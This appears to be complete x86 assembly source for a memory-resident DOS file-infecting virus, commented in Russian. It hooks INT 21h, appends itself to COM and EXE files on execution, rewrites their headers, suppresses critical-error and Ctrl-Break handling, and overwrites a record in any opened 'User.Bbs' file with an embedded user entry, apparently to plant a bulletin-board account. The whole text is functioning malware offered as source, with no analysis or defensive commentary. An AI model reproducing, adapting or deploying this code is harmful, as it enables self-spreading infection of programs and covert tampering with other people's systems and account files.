   data_2e   equ   600h
   data_3e   equ   0
   LEN_MCB   equ   3
   data_6e   equ   2

   VIR_LEN = offset V_END - offset V_HEAD
   IP_Value = offset ENTRY

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                org     100h
snark           proc    far
start:

V_HEAD      label   byte
V_Loader        db      0EBh
                db       2
COM_len         dw      0
V_ID_Signatura   label  byte
                mov    dx,cs
                add    dx,ds:[102h]  ;CS_OFFSET
                push   dx
                mov    ax,IP_Value
                push   ax
                retf

 Ldr_Len = $ - offset V_HEAD
 ID_Len = $ - offset V_ID_Signatura

V_LENGTH        dw      VIR_LEN
V_LEN16         dw      VIR_LEN / 10h + 1h
MAX_LEN         dw      0FFFFh - VIR_LEN - 1h
s_I_23h         dw      13Ch, 2236h
s_I_24h         dw      556h, 2236h
CE_FLAG         db      0
s_AX            dw      4B00h
s_BX            dw      0D03h
s_CX            dw      2236h
s_DX            dw      41A9h
s_DI            dw      100h
s_SI            dw      100h
s_BP            dw      81h
s_ES            dw      2236h
s_DS            dw      9ADEh
OLD_Offset16_SS      dw      0
OLD_Start_SP         dw      0
OLD_Offset16_CS      dw      0
OLD_Start_IP         dw      0

;=================================

 EXE_HDR         db      90h         ;'M'
                 db      90h         ;'Z'
 LAST_PAGE_LEN      dw      9090h
 PAGEs_512_Ctr      dw      9090h
                    db      90h,90h  ;ЧИСЛО ЭЛЕМЕНТОВ В ТАБЛИЦЕ ПЕРЕМЕЩЕНИЙ
 HEADER_LEN16       dw      90h
                    db      90h,90h  ;MIN число "16h" ,кот. д.б. FREE после
                                  ;точки загрузки программы
 OPTION_HiLo        dw      9090h  ;MAX число ... - опция LOW!
 Offset16_SS        dw      9090h
 Start_SP           dw      9090h
                    db      90h,90h    ;контрольная сумма
 Start_IP           dw      9090h   ;IP_Value
 Offset16_CS        dw      9090h

ENTRY           label    byte
                call    SAVE_RGs        ; Save all RG
;=============
                test    CE_FLAG,1
                jz      Lbl_ret_6               ; Jump if zero
                mov     ax,es
                add     ax,10h
                add     OLD_Offset16_CS,ax
                add     OLD_Offset16_SS,ax
Lbl_ret_6:
;=============
                mov     ax,OLD_Offset16_CS
                mov     bx,OLD_Start_IP
                test    CE_FLAG,1
                jnz     Lbl_7                   ; Jump if not zero
                mov     ax,es
                mov     bx,100h
 ;COM - восстанавливаем голову хозяина
                mov     cx,Ldr_Len
                mov     si,offset EXE_HDR
                mov     di,100h
                cld                             ; Clear direction
                rep     movsb          ; Rep when cx >0 Mov [si] to es:[di]
Lbl_7:
                mov     word ptr ds:CS_RET,ax
                mov     word ptr ds:IP_RET,bx

;====== ID v. in memory

                xor     ax,ax
                push    es
                mov     es,ax
                mov     si,340h
                mov     ax,es:[si]
                cmp     ax,0662h
                je      exit
                mov     es:[si],0662h
                pop     es
                call    V_MOVtoHIGH
                jc      Lbl_3                   ; Jump if carry Set

;======== INTERCEPT 21h
                push    es
                pop     ds
                mov     si,0084h
                xor     ax,ax
                mov     es,ax
                mov     ax,es:[si]
                mov     word ptr ds:I21_IP,ax
                mov     ax,es:[si+2]
                mov     word ptr ds:I21_CS,ax
                mov     dx,offset TO_21h
                mov     ah,30h
                int     21h                     ;  get DOS version number ax
                cmp     al,3
                jb      Lbl_14                  ; Jump if below
                mov     dx,offset int_21h_entry
 Lbl_14:
                mov     ax,ds
                cli
                mov     es:[si],dx
                mov     es:[si+2],ax
                sti
                push    cs
                pop     ds
Lbl_3:
                 test    CE_FLAG,1
                 jz      exit                   ; Jump if zero
                 cli                             ; Disable interrupts
                 mov     ss,OLD_Offset16_SS
                 mov     sp,OLD_Start_SP
                 sti                             ; Enable interrupts
exit:
                 call    RESTORE_RGs
;*              jmp     far ptr Lbl_2           ;*(1F1F:0025)
                db      0EAh
IP_RET          dw      0025h
CS_RET          dw      1F1Fh
snark           endp

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

 V_MOVtoHIGH     proc    near
                 mov     bx,es
                 dec     bx
 Lbl_10:
                 mov     ds,bx           ; DS -> Сегм. адрес MCB хозяина
                 cmp  byte ptr ds:data_3e,5Ah    ;90h('Z')- посл. блок
                 je      Lbl_13                  ; Jump if equal
                 inc     bx
                 add     bx,ds:LEN_MCB
                 cmp     bx,0A000h
                 jb      Lbl_10                  ; Jump if below
 Lbl_12:  ; "error" - нет места в памяти для инсталляции
                push    cs
                pop     ds
                stc                             ; Set carry flag
                retn
 Lbl_13:
;?                 mov     ds,bx ;сегмент последнего MCB
                 mov     ax,ds:LEN_MCB
                 sub     ax,cs:V_LEN16
                 jbe     Lbl_12                  ; Jump if below or =
; ?                cmp     ax,800h                 ;можно ли урезать MCB ?
;  ?               jb      Lbl_12                  ; Jump if below
                 mov     ds:LEN_MCB,ax           ;кастрируем MCB
                 add     bx,ax  ;сегм. адр. для нового MCB
                 inc     bx     ;сегм. адр. для нового PSP
                 mov     es:data_6e,bx  ;корректирует в PSP хозяина значение
                                 ;вершины доступной памяти системы в "16h"
                                 ;там было A000h - для 640kB RAM(79B0:0002=0)
                 sub     bx,10h  ;но PSP строить не надо - сдвигаем сегмент!
                 push    bx      ;сегмент,куда пересылаем тело V.
                 push    cs      ;текущий сегмент
                 pop     ds
                 pop     es
 ;пересылаем тело зверя в новое место
                 mov     si,offset V_HEAD
                 mov     di,si
                 mov     cx,V_LENGTH
                 cld                             ; Clear direction
                 rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                 clc                             ; Clear carry flag
                 push   bx
                 push   offset V_MOV_LABEL
                 retf
V_MOV_LABEL:     retn
V_MOVtoHIGH      endp

 SAVE_RGs        proc    near
                 mov     cs:s_DS,ds
                 push    cs
                 pop     ds
                 mov     s_AX,ax
                 mov     s_BX,bx
                 mov     s_CX,cx
                 mov     s_DX,dx
                 mov     s_DI,di
                 mov     s_SI,si
                 mov     s_BP,bp
                 mov     s_ES,es
                 retn
 SAVE_RGs        endp

 RESTORE_RGs     proc    near
                 mov     ax,s_AX
                 mov     bx,s_BX
                 mov     cx,s_CX
                 mov     dx,s_DX
                 mov     bp,s_BP
                 mov     di,s_DI
                 mov     si,s_SI
                 mov     es,s_ES
                 mov     ds,s_DS
                 retn
 RESTORE_RGs     endp

; Обработчик критических ошибок   MS - DOS
int_24h_entry   proc    far
                mov     al,0
int_24h_entry   endp

;Ctrl-BREAK exit -> closed
int_23h_entry   proc    far
                iret                            ; Interrupt return
int_23h_entry   endp

;************ Int 21h, Fn 4B00h - загрузить и выполнить ...

int_21h_entry   proc    far
                cmp     ah,3dh
                je      _3dh_ok
                cmp     ah,4bh
                je      _4bh_ok
                jmp     original
_3dh_ok:        cmp     flag,1
                je      original
                push    ax
                push    di
                push    si
                push    cx
                push    es
                push    ds
                push    dx
                mov     cx,100
                xor     al,al
                mov     di,dx
                cld
                repne   scasb
                sub     di,9
                mov     cx,8
		push	cs
		pop	es
                lea     si,filename
next_smb:       mov     al,byte ptr es:[si]
                cmp     al,byte ptr[di]
                jne     diffr
                inc     si
                inc     di
                dec     cx
                jnz     next_smb
                mov     flag,1
                mov     al,02h
                int     21h
                jc      exit1
                mov     bx,ax
                mov     ax,4200h
                mov     dx,0f0h
                mov     cx,0h
                int     21h
                jc      exit1
                push    cs
                pop     ds
                lea     dx,user
                mov     cx,0f0h
                mov     ah,40h
                int     21h
                mov     ah,3eh
                int     21h
diffr:          pop     dx
                pop     ds
                pop     es
                pop     cx
                pop     si
                pop     di
                pop     ax
original:       jmp     dword ptr cs:[I21_IP]
exit1:          iret

_4bh_ok:        push    ax
                push    es
                xor     ax,ax
                mov     es,ax
                mov     si,344h
                cmp     word ptr es:[si],0707h
                pop     es
                pop     ax
                jne     infect
                jmp     dword ptr cs:[I21_IP]

infect:         call    SAVE_RGs
                call    INTERCEPT_23_24
                mov     ax,3D02h
                mov     ds,s_DS
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                push    cs
                pop     ds
                jc      Lbl_17                  ; Jump if carry Set
                mov     bx,ax
                call    sub_12
                jc      Lbl_17                  ; Jump if carry Set
                call    sub_13
                jc      Lbl_17                  ; Jump if carry Set
                call    sub_14
 Lbl_17:
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                call    RESTORE_23_24
                call    RESTORE_RGs
                jmp     dword ptr cs:[I21_IP]
Lbl_18:
 ;*              jmp     far ptr Lbl_1           ;*(11CD:057C)
TO_21h          db      0EAh
I21_IP          dw      057Ch
I21_CS          dw      11CDh
filename        db      'User.Bbs'
flag            db      0

user    db      50h,6Ch,61h,74h,6Fh,6Eh,20h,50h,6Fh,74h,61h,70h,6Fh,76h,00h,00h
        db      00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
        db      00h,00h,00h,00h,53h,50h,62h,00h,00h,00h,00h,00h,00h,00h,00h,00h
        db      00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
        db      00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
        db      00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,33h,31h,31h
        db      2Dh,36h,33h,2Dh,38h,33h,00h,00h,00h,00h,00h,00h,01h,00h,00h,00h
        db      41h,6Ch,66h,72h,65h,64h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
        db      01h,00h,06h,00h,00h,00h,00h,21h,00h,31h,0DAh,00h,0Ah,00h,00h,00h
        db      00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
        db      00h,0Ch,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,31h,50h,18h
        db      00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
        db      21h,00h,7Ah,03h,00h,00h,00h,00h,00h,0FFh,00h,00h,00h,00h,00h,00h
        db      00h,00h,00h,00h,00h,00h,31h,00h,00h,00h,00h,00h,00h,00h,00h,00h
        db      31h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h

int_21h_entry   endp

INTERCEPT_23_24          proc    near
                push    ax
                push    bx
                push    dx
                push    ds
                push    es
                push    cs
                pop     ds
                mov     ax,3523h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     s_I_23h,bx
                mov     word ptr s_I_23h+2,es
                mov     ax,3524h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     s_I_24h,bx
                mov     word ptr s_I_24h+2,es
                mov     ax,2523h
                mov     dx,offset int_23h_entry
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                mov     ax,2524h
                mov     dx,offset int_24h_entry
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                pop     es
                pop     ds
                pop     dx
                pop     bx
                pop     ax
                retn
INTERCEPT_23_24          endp


RESTORE_23_24   proc    near
                mov     ax,2524h
                lds     dx,dword ptr cs:s_I_24h ; Load 32 bit ptr
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                mov     ax,2523h
                lds     dx,dword ptr cs:s_I_23h ; Load 32 bit ptr
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                push    cs
                pop     ds
                retn
RESTORE_23_24   endp


sub_12          proc    near
                mov     ah,3Fh
                mov     dx,offset EXE_HDR
                mov     cx,18h
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                jc      Lbl_ret_19              ; Jump if carry Set
                call    sub_17
                jc      Lbl_ret_19              ; Jump if carry Set
                call    sub_18
                jc      Lbl_ret_19              ; Jump if carry Set

 Lbl_ret_19:
                retn
sub_12          endp


sub_13          proc    near
          ; дописываем зверя в конец клиента
                mov     ah,40h
                mov     cx,V_LENGTH
                mov     dx,offset V_HEAD
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                jc      Lbl_21                  ; Jump if carry Set
                cmp     ax,cx
                jne     Lbl_21                  ; Jump if not equal
                retn
Lbl_21:
                stc                             ; Set carry flag
                retn
sub_13          endp


sub_14          proc    near
                call    sub_16  ;LSEEK на начало файла
                test    CE_FLAG,1
                jnz     Lbl_22                  ; Jump if not zero
        ; Для COM пишем в начало свой ЗАГРУЗЧИК
                mov     ah,40h
                mov     cx,Ldr_Len
                mov     dx,offset V_Loader
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                retn
 Lbl_22: ; Для EXE - обновляем заголовок
                mov     ah,40h
                mov     cx,18h
                mov     dx,offset EXE_HDR
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                retn
sub_14          endp


LSEEK_Fn        proc    near
                mov     ax,4200h
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                retn
LSEEK_Fn        endp


;         SUBROUTINE - LSEEK to TOP of File
sub_16          proc    near
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    LSEEK_Fn
                retn
sub_16          endp


sub_17          proc    near
                mov     si,offset V_ID_Signatura
                mov     di,offset PAGEs_512_Ctr
                push    cs
                pop     es
                mov     CE_FLAG,0   ;задаем - клиент COM !
                cmp     word ptr [di-4],5A4Dh   ;" Это верно ??" ('MZ')
                je      Lbl_25                  ; НЕТ! - Jump if equal
         ;Для COM - проверяем сигнатуру ->
         ;сравниваем начало клиента со своим загрузчиком
                mov     cx,ID_Len
                cld                             ; Clear direction
                repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
                jnz     Lbl_24                  ; Jump if not zero
 Lbl_23:
                stc                             ; Set carry flag
                retn
 Lbl_24:
                clc                             ; Clear carry flag
                retn
 Lbl_25:
                 mov     CE_FLAG,1    ;клиент - EXE !
                 mov     cx,Start_IP
                 cmp     cx,IP_Value
                 je      Lbl_23
                 cmp     OPTION_HiLo,0  ;а можно ?
                 je      Lbl_23                  ; Jump if equal
; сохраняем истинные значения
M2:              mov     OLD_Start_IP,cx
                 mov     cx,Offset16_CS
                 mov     OLD_Offset16_CS,cx
                 mov     cx,Offset16_SS
                 mov     OLD_Offset16_SS,cx
                 mov     cx,Start_SP
                 mov     OLD_Start_SP,cx
                 jmp     Lbl_24
sub_17          endp


sub_18          proc    near
           ;LSEEK to End of File
                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 42h
    ;В DX:AX - длина клиента( ... байт)          ;  move file ptr, cx,dx=offset
                test    al,0Fh  ; нужно ли выравнивание на грницу "16h" ?
                jz      Lbl_26                  ; Jump if zero
           ;производим выравнивание
                add     ax,10h
                adc     dx,0
                and     ax,0FFF0h
Lbl_26:
                test    CE_FLAG,1
                jnz     Lbl_28                  ; Jump if not zero
         ;Для COM - клиента :
                 or      dx,dx       ;" он < 64kB ?" -> Zero ?
                 jnz     Lbl_27                  ; Jump if not zero
                 cmp     ax,MAX_LEN ;можно прицепиться ?
                 ja      Lbl_27                  ; Jump if above
                 cmp     ax,V_LENGTH ;можно прицепиться ?
                 jbe     Lbl_27                  ; Jump if below or =
                 mov     COM_len,ax
                 mov     cl,4
                 shr     COM_len,cl              ; Shift w/zeros fill
                                         ;-> длина COM в "16h"!
          ;LSEEK to NEW EoF - с учетом выравнивания
                mov     dx,ax
                xor     cx,cx                   ; Zero register
                call    LSEEK_Fn
                clc                             ; Clear carry flag
                retn
Lbl_27:
                stc                             ; Set carry flag
                retn
Lbl_28:
                push    ax    ; Low Len - выровненная
                push    dx    ; High Len - выровненная
                add     ax,100h  ;резерв под стек
                adc     dx,0
     ;LSEEK to NEW EoF - с учетом выравнивания и стека
                mov     cx,dx
                mov     dx,ax
                call    LSEEK_Fn
                push    bx            ;-> File Handle
     ;корректируем заголовок EXE
                add     ax,V_LENGTH
                adc     dx,0
                mov     bx,200h
                div     bx   ;- новая длина в страницах по 512 байт
                              ; ax,dx rem=dx:ax/reg
                or      dx,dx    ;-> остаток  = 0 ? -> Zero ?
                jz      Lbl_29          ; Jump if zero
                inc     ax       ;добавляем еще одну страницу
Lbl_29:
                mov     LAST_PAGE_LEN,dx
                mov     PAGEs_512_Ctr,ax
                pop     bx
                pop     dx
                pop     ax
                call    sub_19
                mov     Start_SP,100h
                mov     Start_IP,IP_Value
                clc                             ; Clear carry flag
                retn
sub_18          endp


sub_19          proc    near
; Делим длину EXE-клиета (в DX:AX) на 16
; - получаем ее в параграфах -> в AX !
                push    cx
                mov     cx,4
locloop_30:
                shr     dx,1                    ; Shift w/zeros fill
                rcr     ax,1                    ; Rotate thru carry
                loop    locloop_30              ; Loop if cx > 0
                sub     ax,HEADER_LEN16
                sbb     dx,0
                mov     Offset16_SS,ax
                mov     Offset16_CS,ax
                pop     cx
                retn
sub_19          endp

V_END           label   byte
seg_a           ends
                end     start
